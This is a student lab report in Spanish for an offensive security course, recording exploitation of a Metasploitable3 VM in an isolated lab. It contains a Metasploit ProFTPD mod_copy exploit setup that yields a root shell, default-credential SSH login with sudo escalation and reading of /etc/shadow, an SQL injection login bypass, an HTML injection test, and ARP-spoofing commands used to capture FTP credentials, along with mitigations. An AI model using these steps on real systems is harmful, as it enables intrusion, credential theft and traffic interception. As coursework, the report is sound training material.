# Evaluación 2 – Ciberseguridad Ofensiva

**Asignatura:** OCY1104 – Ciberseguridad Ofensiva  
**Fecha:** 19 de mayo de 2026  
**Estudiante:** Benjamín Santis Hermosilla  
**Profesor:** Felipe Andrés Cáceres Salinas

---

## Descripción

Explotación práctica de vulnerabilidades sobre Metasploitable3 en tres categorías: sistema operativo, aplicaciones web y redes. Se aplicó un enfoque sistemático y ético demostrando las implicaciones reales de cada falla en un entorno controlado.

---

## Entorno

| Dispositivo      | IP        | Rol               |
|------------------|-----------|-------------------|
| Kali Linux       | 10.0.2.5  | Atacante / MITM   |
| Metasploitable 3 | 10.0.2.15 | Objetivo          |
| Gateway          | 10.0.2.1  | Router de red     |

---

## Herramientas utilizadas

- **nmap** – escaneo de puertos y servicios
- **Metasploit Framework** – explotación de vulnerabilidades
- **arpspoof** – envenenamiento de caché ARP
- **Wireshark** – captura y análisis de tráfico de red
- **Navegador web** – explotación manual de SQLi y XSS

---

## Servicios identificados (nmap -sV)

| Puerto    | Servicio                     |
|-----------|------------------------------|
| 21/tcp    | ProFTPD 1.3.5                |
| 22/tcp    | OpenSSH 6.6.1p1              |
| 80/tcp    | Apache httpd 2.4.7           |
| 445/tcp   | Samba 3.x–4.x                |
| 3306/tcp  | MySQL (sin autenticación)    |
| 8080/tcp  | Jetty / Apache Continuum     |

---

## Explotación de vulnerabilidades en sistema operativo

### SO #1 – ProFTPD 1.3.5 mod_copy (CVE-2015-3306)

El módulo `mod_copy` permite copiar archivos al servidor sin autenticación. Se utilizó el módulo `unix/ftp/proftpd_modcopy_exec` de Metasploit para copiar un payload PHP al directorio web y ejecutarlo remotamente.

**Configuración del exploit:**
```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.0.2.15
set LHOST 10.0.2.5
set SITEPATH /var/www/html
run
```

**Resultado:** shell como `uid=0(root)`, control total verificado con `id`, `whoami` y `cat /etc/passwd`.

---

### SO #2 – SSH con credenciales por defecto + escalada de privilegios

Metasploitable3 mantiene las credenciales por defecto `vagrant/vagrant`. El usuario tiene permisos `sudo` sin restricciones.

**Proceso:**
```bash
ssh vagrant@10.0.2.15   # acceso con credenciales por defecto
sudo su                  # escalada a root sin contraseña
cat /etc/shadow          # lectura de hashes del sistema
```

**Resultado:** acceso root completo, lectura de `/etc/shadow` con todos los hashes de contraseñas del sistema.

---

## Explotación de vulnerabilidades en aplicaciones web

### Web #1 – SQL Injection en payroll_app.php

El campo `User` del formulario de login no sanitiza el input, permitiendo inyección SQL directa.

**Payload utilizado:**
```
User: ' OR '1'='1
Password: (cualquier valor)
```

**Consulta equivalente ejecutada:**
```sql
SELECT * FROM users WHERE user='' OR '1'='1'
```

**Resultado:** bypass completo de autenticación y exposición de datos de empleados (nombre, apellido, salario).

---

### Web #2 – Cross-Site Scripting (XSS) reflejado en payroll_app.php

La misma aplicación refleja el input del campo `User` directamente en la respuesta HTML sin sanitización.

**Payload utilizado:**
```html
<h1 style="color:red">HACKEADO</h1>
```

**Resultado:** el HTML inyectado fue renderizado por el navegador. En un escenario real permitiría robo de cookies de sesión, redirección maliciosa o ejecución de JavaScript en el navegador de la víctima.

---

## Explotación de vulnerabilidades en redes

### ARP Spoofing

Se envenenó la caché ARP de Metasploitable3 y del gateway para redirigir todo el tráfico a través de Kali.

```bash
# Habilitar IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Terminal 1 – envenenar víctima
sudo arpspoof -i eth0 -t 10.0.2.15 10.0.2.1

# Terminal 2 – envenenar gateway
sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
```

**Resultado:** todo el tráfico de la víctima redirigido a través del atacante sin detección.

---

### MITM – Captura de credenciales FTP (Wireshark)

Con ARP Spoofing activo, se capturó el tráfico FTP en texto plano mediante Wireshark (filtro `ftp`).

**Paquetes capturados:**
- `Request: USER vagrant`
- `Request: PASS vagrant`
- `Response: 230 User vagrant logged in`

**Resultado:** credenciales FTP interceptadas en texto plano, demostrando el riesgo de protocolos no cifrados en redes locales.

---

## Medidas de prevención

| Vector            | Contramedida recomendada                                          |
|-------------------|-------------------------------------------------------------------|
| FTP texto plano   | Migrar a SFTP / FTPS                                             |
| ARP Spoofing      | Dynamic ARP Inspection (DAI) en switches gestionados             |
| Credenciales      | Eliminar defaults, aplicar principio de mínimo privilegio en sudo |
| SQL Injection     | Usar prepared statements / queries parametrizadas                |
| XSS               | Sanitizar y escapar todo input de usuario antes de renderizar     |
| Segmentación      | VLANs para aislar segmentos críticos + 802.1X para autenticación |

---

## Conclusión

La evaluación demostró que vulnerabilidades comunes en servicios, aplicaciones web y protocolos de red pueden encadenarse para comprometer completamente un sistema. ProFTPD sin parchear, credenciales por defecto con sudo irrestricto, SQLi/XSS por falta de sanitización y FTP en texto plano representan vectores críticos. La correcta configuración en cada capa del sistema, el uso de protocolos cifrados y la aplicación consistente de parches son las medidas fundamentales para mitigar estos riesgos.
